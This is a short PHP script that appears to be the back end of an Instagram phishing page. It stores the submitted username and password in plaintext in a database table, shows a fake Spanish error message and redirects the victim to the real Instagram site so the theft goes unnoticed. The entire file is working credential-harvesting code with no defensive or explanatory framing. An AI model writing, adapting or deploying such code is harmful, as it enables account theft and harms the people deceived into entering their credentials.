<?php 
session_start();
include("conect.php");
$conexion = conectar();
$user= mysqli_real_escape_string($conexion, $_POST['user']);
$pass= mysqli_real_escape_string($conexion, $_POST['pass']);
$sql=mysqli_query($conexion,"INSERT INTO `social_network` (`id`, `user`, `pass`, `try_num`) VALUES (NULL, '$user', '$pass', '2')");

echo '<script>alert("Lo sentimos algo salió mal, por favor intenta de nuevo.")</script>';
echo "<script>location.href='https://www.instagram.com/'</script>";

mysqli_close($conexion);

?>
